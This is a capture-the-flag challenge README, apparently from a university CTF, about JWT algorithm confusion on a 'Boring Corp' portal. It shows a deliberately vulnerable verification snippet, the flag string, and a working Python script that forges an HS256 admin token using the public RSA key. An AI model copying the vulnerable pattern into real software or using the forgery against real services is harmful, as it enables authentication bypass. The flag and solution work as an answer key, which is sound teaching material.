# Web Challenge 2 — Boring Corp: JWT Algorithm Confusion

| Field      | Detail                                               |
|------------|------------------------------------------------------|
| Category   | Web / Cryptography                                   |
| Difficulty | Medium-Hard                                          |
| Points     | 400                                                  |
| Port       | 5002                                                 |
| Flag       | `ctfupb{3v3n_th3_fl4g_1s_b0r1ng_zzz}` |

---

## Challenge description

**Boring Corp** is a corporate consultancy whose internal employee portal is
protected with RS256-signed JWTs.  The `/api/public-key` endpoint exposes the
public key so partner integrations can verify tokens.

The `/api/flag` endpoint returns the flag, but only to tokens with `role: admin`.
Logging in gives you a token with `role: user`.

Can you forge an admin token without knowing the private key?

---

## Vulnerability — Algorithm Confusion (CVE-class)

The server reads the `alg` field from the **unverified token header** and uses
it to select the verification algorithm:

```python
# Vulnerable snippet in app.py
header = jwt.get_unverified_header(token)
alg = header.get("alg", "")

if alg == "HS256":
    payload = jwt.decode(token, PUBLIC_KEY, algorithms=["HS256"])
elif alg == "RS256":
    payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
```

The RSA public key (PEM) is **publicly known** (it lives at `/api/public-key`).
If an attacker creates a token with `alg: HS256` and signs it using that public
key as the HMAC secret, the server verifies it successfully — because it also
uses `PUBLIC_KEY` as the HS256 secret.

### Attack flow

```
1. GET /api/public-key           →  obtain the RSA public key PEM
2. Craft JWT { role: "admin" }   →  alg=HS256, signed with PUBLIC_KEY as HMAC secret
3. GET /api/flag  -H "Authorization: Bearer <forged_token>"  →  🏁 flag
```

---

## Setup

```bash
cd web/reto_jwt_confusion
docker compose up --build -d
# Challenge available at http://localhost:5002
```

RSA keys are generated **automatically** at Docker build time, so every
deployment gets its own unique key pair.

---

## Solution

```bash
pip install requests PyJWT cryptography
python3 solution/solve.py http://localhost:5002
```

### Manual step-by-step exploit

```python
import requests, jwt

base = "http://localhost:5002"

# 1. Obtener clave pública
pub = requests.get(f"{base}/api/public-key").text.strip()

# 2. Forjar token HS256 con la clave pública como secreto HMAC
token = jwt.encode({"username": "hacker", "role": "admin"}, pub, algorithm="HS256")

# 3. Obtener la flag
r = requests.get(f"{base}/api/flag", headers={"Authorization": f"Bearer {token}"})
print(r.json())
```
